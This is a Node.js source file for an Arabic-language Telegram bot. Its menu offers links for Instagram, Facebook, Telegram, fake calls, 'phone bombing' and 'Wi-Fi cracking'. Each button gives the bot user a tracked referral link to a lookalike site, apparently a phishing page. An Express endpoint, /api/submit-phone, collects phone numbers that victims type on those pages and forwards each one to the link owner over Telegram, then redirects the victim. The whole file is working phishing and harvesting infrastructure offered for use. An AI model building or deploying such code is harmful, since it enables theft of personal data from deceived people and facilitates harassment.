const  TelegramBot = require("node-telegram-bot-api");
const express = require("express");
const { Pool } = require("pg");
const crypto = require("crypto");

// ==============================
// الإعدادات الأساسية
// ==============================
const TOKEN = process.env.BOT_TOKEN;
if (!TOKEN) { console.error("❌ BOT_TOKEN is missing"); process.exit(1); }

const DATABASE_URL = process.env.DATABASE_URL;
if (!DATABASE_URL) { console.error("❌ DATABASE_URL is missing"); process.exit(1); }

const PORT = process.env.PORT || 3000;

// ==============================
// تشغيل السيرفر (Express)
// ==============================
const app = express();
app.use(express.json());

// ==============================
// الاتصال بقاعدة البيانات (PostgreSQL)
// ==============================
const pool = new Pool({
    connectionString: DATABASE_URL,
    ssl: { rejectUnauthorized: false }
});

// إنشاء الجدول إذا لم يكن موجوداً
async function initDatabase() {
    await pool.query(`
        CREATE TABLE IF NOT EXISTS referrals (
            token TEXT PRIMARY KEY,
            telegram_id TEXT NOT NULL,
            created_at TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP
        )
    `);
    console.log("✅ PostgreSQL Database Connected & Ready");
}
initDatabase().catch((error) => { 
    console.error("❌ Database init error:", error); 
    process.exit(1); 
});

// ==============================
// دوال المساعدة (Helper Functions)
// ==============================
function createToken() { return crypto.randomBytes(32).toString("hex"); }

async function createReferral(chatId) {
    const token = createToken();
    await pool.query(`INSERT INTO referrals (token, telegram_id) VALUES ($1, $2)`, [token, String(chatId)]);
    return token;
}

async function getReferral(token) {
    const result = await pool.query(`SELECT * FROM referrals WHERE token = $1`, [token]);
    return result.rows[0] || null;
}

// ==============================
// إعداد بوت التليجرام
// ==============================
const bot = new TelegramBot(TOKEN, { polling: true });
console.log("🤖 Telegram Bot is running...");

// مجموعة لحفظ المستخدمين الذين وافقوا (بشكل مؤقت في الذاكرة)
const acceptedUsers = new Set();

// ==============================
// القائمة الرئيسية (أزرار البوت)
// ==============================
function sendMainMenu(chatId) {
    return bot.sendMessage(
        chatId,
        "👋 أهلاً بك في القائمة الرئيسية\n\nاختر المنصة التي تريدها من الأسفل:",
        {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "📸 Instagram", callback_data: "instagram" },
                        { text: "📘 Facebook", callback_data: "facebook" }
                    ],
                    [
                        { text: "✈️ Telegram", callback_data: "telegram" },
                        { text: "📞 اتصال وهمي", callback_data: "twitter" }
                    ],
                    [
                        { text: "💬 تفجير هواتف", callback_data: "تفجير هواتف" },
                        { text: "📶 فك شبكات Wi-Fi", callback_data: "whatsapp" }
                    ],
                    // الزر الجديد للإحصائيات
                    [
                        { text: "📊 إحصائيات البوت", callback_data: "stats" }
                    ]
                ]
            }
        }
    );
}

// ==============================
// أمر /start
// ==============================
bot.onText(/^\/start$/, async (msg) => {
    const chatId = msg.chat.id;
    const firstName = msg.from?.first_name || "غير معروف";
    const lastName = msg.from?.last_name || "";
    const username = msg.from?.username ? `@${msg.from.username}` : "لا يوجد";
    const fullName = `${firstName} ${lastName}`.trim();

    // إذا كان المستخدم وافق مسبقاً، نرسل له القائمة فوراً
    if (acceptedUsers.has(chatId)) {
        return sendMainMenu(chatId);
    }

    // عرض شروط الاستخدام
    await bot.sendMessage(
        chatId,
        `👋 أهلاً بك ${fullName}

🆔 معرف Telegram الخاص بك: ${chatId}
👤 Username: ${username}

📋 شروط استخدام البوت:
أنا غير مسؤول عن أي استخدام غير رسمي للبوت.
باستخدامك للبوت، أنت تقر بأنك قرأت الشروط وتوافق عليها.`,
        {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "✅ أوافق على الشروط", callback_data: "accept_terms" }]
                ]
            }
        }
    );
});

// ==============================
// معالجة ضغط الأزرار (Callback Queries)
// ==============================
bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;

    try {
        // 1. قبول الشروط
        if (query.data === "accept_terms") {
            acceptedUsers.add(chatId);
            await bot.answerCallbackQuery(query.id, { text: "تم قبول الشروط ✅" });
            await bot.sendMessage(chatId, `✅ تم قبول الشروط.\nأهلاً بك ${query.from.first_name || ""}.\n🆔 ID الخاص بك: ${chatId}\nاضغط /start للمتابعة.`);
            return;
        }

        // التحقق من الموافقة على الشروط قبل تنفيذ أي أمر آخر
        if (!acceptedUsers.has(chatId)) {
            await bot.answerCallbackQuery(query.id, { text: "يجب الموافقة على الشروط أولاً." });
            return;
        }

        // 2. زر الإحصائيات
        if (query.data === "stats") {
            const usersResult = await pool.query("SELECT COUNT(DISTINCT telegram_id) FROM referrals");
            const totalUsers = parseInt(usersResult.rows[0].count);

            const tokensResult = await pool.query("SELECT COUNT(*) FROM referrals");
            const totalTokens = parseInt(tokensResult.rows[0].count);

            await bot.answerCallbackQuery(query.id);
            await bot.sendMessage(
                chatId,
                `📊 **إحصائيات البوت الحالية:**

👥 إجمالي المستخدمين المسجلين: ${totalUsers}
🔗 إجمالي الروابط المُنشأة: ${totalTokens}

⏱️ آخر تحديث: الآن`,
                { parse_mode: "Markdown" }
            );
            return;
        }

        // 3. باقي الأزرار (إنشاء الروابط)
        const token = await createReferral(chatId);

        const websites = {
            instagram: "https://instagram-two-henna.vercel.app/",
            facebook: "https://facebook-ruby-one.vercel.app/",
            telegram: "https://telegram-one-rho.vercel.app/",
            twitter: "https://callmyphone.org/",
            whatsapp: "https://wifi-free-gamma.vercel.app/",
            "تفجير هواتف": "https://kexart.com/"
        };

        const website = websites[query.data];
        if (!website) {
            await bot.answerCallbackQuery(query.id);
            return;
        }

        const separator = website.includes("?") ? "&" : "?";
        const referralUrl = `${website}${separator}ref=${token}`;

        await bot.sendMessage(chatId, `🔗 هذا رابطك الخاص:\n\n${referralUrl}\n\nيمكنك مشاركة الرابط.`);
        await bot.answerCallbackQuery(query.id);

    } catch (error) {
        console.error("❌ Callback error:", error);
        try { await bot.answerCallbackQuery(query.id, { text: "حدث خطأ، حاول مرة أخرى." }); } catch (_) {}
    }
});

// ================================================================
// ⭐️ التعديل الجديد: مسار استقبال الأرقام وإرسالها لصاحب الرابط ⭐️
// ================================================================
app.post("/api/submit-phone", async (req, res) => {
    try {
        const { phone, ref, nextPage } = req.body;

        // التحقق من وجود البيانات
        if (!phone || !ref) {
            return res.status(400).json({ success: false, message: "رقم الهاتف أو المرجع ناقص" });
        }

        // 1. البحث في الداتابيز عن صاحب هذا التوكن (ref)
        const referral = await getReferral(ref);

        if (!referral) {
            return res.status(404).json({ success: false, message: "الرابط غير صالح أو منتهي" });
        }

        // 2. معرف صاحب الرابط (الذي سيتلقى الرسالة)
        const targetChatId = referral.telegram_id;

        // 3. إرسال الإشعار لصاحب الرابط عبر البوت
        await bot.sendMessage(
            targetChatId, 
            `📩 **تنبيه وصول بيانات جديدة!**\n\n📞 رقم الهاتف الذي تم إدخاله:\n\`${phone}\`\n\n🔗 تم الدخول عبر رابطك الخاص.`, 
            { parse_mode: "Markdown" }
        );

        // 4. الرد على الموقع بأن العملية نجحت (ليتم التوجيه للصفحة التالية)
        res.json({ 
            success: true, 
            message: "تم إرسال البيانات لصاحب الرابط بنجاح",
            nextPage: nextPage || "https://www.google.com" 
        });

    } catch (error) {
        console.error("❌ Error in /api/submit-phone:", error);
        res.status(500).json({ success: false, message: "خطأ داخلي في السيرفر" });
    }
});
// ================================================================

// ==============================
// الصفحة الرئيسية للويب (اختياري)
// ==============================
app.get("/", (req, res) => {
    res.send("✅ Telegram Bot Server is running successfully!");
});

// ==============================
// تشغيل السيرفر
// ==============================
app.listen(PORT, () => {
    console.log(`🌐 Web Server running on port ${PORT}`);
});
